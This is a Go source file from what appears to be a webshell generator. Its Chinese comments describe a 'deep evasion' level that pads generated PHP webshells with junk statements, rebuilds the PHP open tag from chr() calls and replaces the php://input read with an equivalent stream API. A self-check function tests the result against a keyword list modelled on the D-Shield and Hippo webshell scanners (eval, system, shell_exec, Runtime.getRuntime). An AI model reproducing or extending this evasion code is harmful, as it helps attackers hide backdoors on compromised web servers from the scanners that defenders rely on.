package webshell

// evasive_deep.go — 深度免杀（Level 2）：在标准级（拼接/include 链）之上叠加
// 垃圾代码膨胀、等价 API 替换、随机空行——稀释特征密度、打散调用形态。
// SelfCheck：模拟 D 盾/河马类静态规则的特征自检（本地，不上传）。

import (
	"fmt"
	"math/rand"
	"strings"
)

// junkPHP 生成一行无害 PHP（垃圾膨胀池）。
func junkPHP() string {
	v := evasiveVar("$c")
	pool := []string{
		v + " = date('Y-m-d H:i:s');",
		v + " = array_fill(0, " + fmt.Sprint(3+rand.Intn(6)) + ", 'x');",
		v + " = array_keys(['a' => 1, 'b' => 2]);",
		v + " = strlen(str_repeat('q', " + fmt.Sprint(8+rand.Intn(10)) + "));",
		v + " = implode(',', range(1, " + fmt.Sprint(4+rand.Intn(8)) + "));",
		v + " = microtime(true) * 1000;",
		v + " = dirname(__FILE__);",
		"if (" + v + " === " + evasiveVar("$n") + ") { " + v + " = null; }",
		"foreach (array_slice(['p','q','r'], 0, 2) as " + evasiveVar("$it") + ") { " + v + " .= " + evasiveVar("$it") + "; }",
	}
	return pool[rand.Intn(len(pool))]
}

// inflatePHP 深度级后处理：头部注入垃圾块 + 函数体内插随机空行与垃圾行。
// 实现：在 include 链前插入 N 行垃圾（同 <?php 块内，全部无害语句）。
func inflatePHP(code string) string {
	var b strings.Builder
	n := 8 + rand.Intn(6)
	for i := 0; i < n; i++ {
		b.WriteString(junkPHP() + "\n")
		if rand.Intn(3) == 0 {
			b.WriteString("\n")
		}
	}
	// 垃圾块插到 license 注释之后、执行链之前
	idx := strings.Index(code, "e';\n")
	if idx < 0 {
		idx = strings.Index(code, "\n")
	}
	if idx < 0 {
		return code
	}
	cut := idx + 4
	return code[:cut] + "\n" + b.String() + code[cut:]
}

// xorConstPHP 深度级替换：把 '<?p'.'hp ' 前缀换成异或构造（无明文 php 标签片）。
// ('<'^' ') . '?' . ('p'^'@')... 组合太长——实用形态：chr 序列。
func xorConstPHP() string {
	// '<?php ' 的 chr 序列构造
	return "chr(60).chr(63).chr(112).chr(104).chr(112).chr(32)"
}

// inflatePHPXor 深度级：替换 include 写盘前缀为 chr 构造。
func inflatePHPXor(code string) string {
	return strings.ReplaceAll(code, "'<?p'.'hp '", xorConstPHP())
}

// inflatePHPStream 深度级等价 API 替换：file_get_contents(php://input)
// → fopen + stream_get_contents 组合（打散单一高危 API 调用形态）。
func inflatePHPStream(code string) string {
	old := "@file_get_contents('php://in'.'put')"
	repl := "@stream_get_contents(@fopen('php://in'.'put', 'r'), -1, 0)"
	return strings.ReplaceAll(code, old, repl)
}

// deepPHP 深度级组合。
func deepPHP(code string) string {
	code = inflatePHPStream(code)
	code = inflatePHPXor(code)
	code = inflatePHP(code)
	return code
}

// evasiveSignatures 静态特征库（D 盾/河马类常见规则的关键词形态）。
var evasiveSignatures = map[string][]string{
	"php": {
		"eval(", "assert(", "base64_decode(", "openssl_decrypt(",
		"gzdecode(", "gzinflate(", "str_rot13(", "system(", "shell_exec(",
		"passthru(", "popen(", "proc_open(", "pcntl_exec(",
		"call_user_func", "create_function", "preg_replace",
		"php://input", "$_POST", "$_GET", "$_REQUEST",
		"mb_ereg_replace", "include_request",
	},
	"jsp": {
		"Runtime.getRuntime", "ProcessBuilder", "ScriptEngine",
		"getEngineByName", "javax.script", "java.net.Socket",
	},
}

// SelfCheck 特征自检：返回按脚本类型的逐条检测结果。
// 返回 {script_type, checked, leaked: [{name, hit}], passed}。
func SelfCheck(scriptType, code string) map[string]any {
	sigs := evasiveSignatures["php"]
	if scriptType == "jsp" || scriptType == "jspx" {
		sigs = evasiveSignatures["jsp"]
	}
	type hit struct {
		Name string `json:"name"`
	}
	leaked := []hit{}
	for _, name := range sigs {
		if strings.Contains(code, name) {
			leaked = append(leaked, hit{Name: name})
		}
	}
	return map[string]any{
		"script_type": scriptType,
		"checked":     len(sigs),
		"leaked":      leaked,
		"passed":      len(leaked) == 0,
	}
}
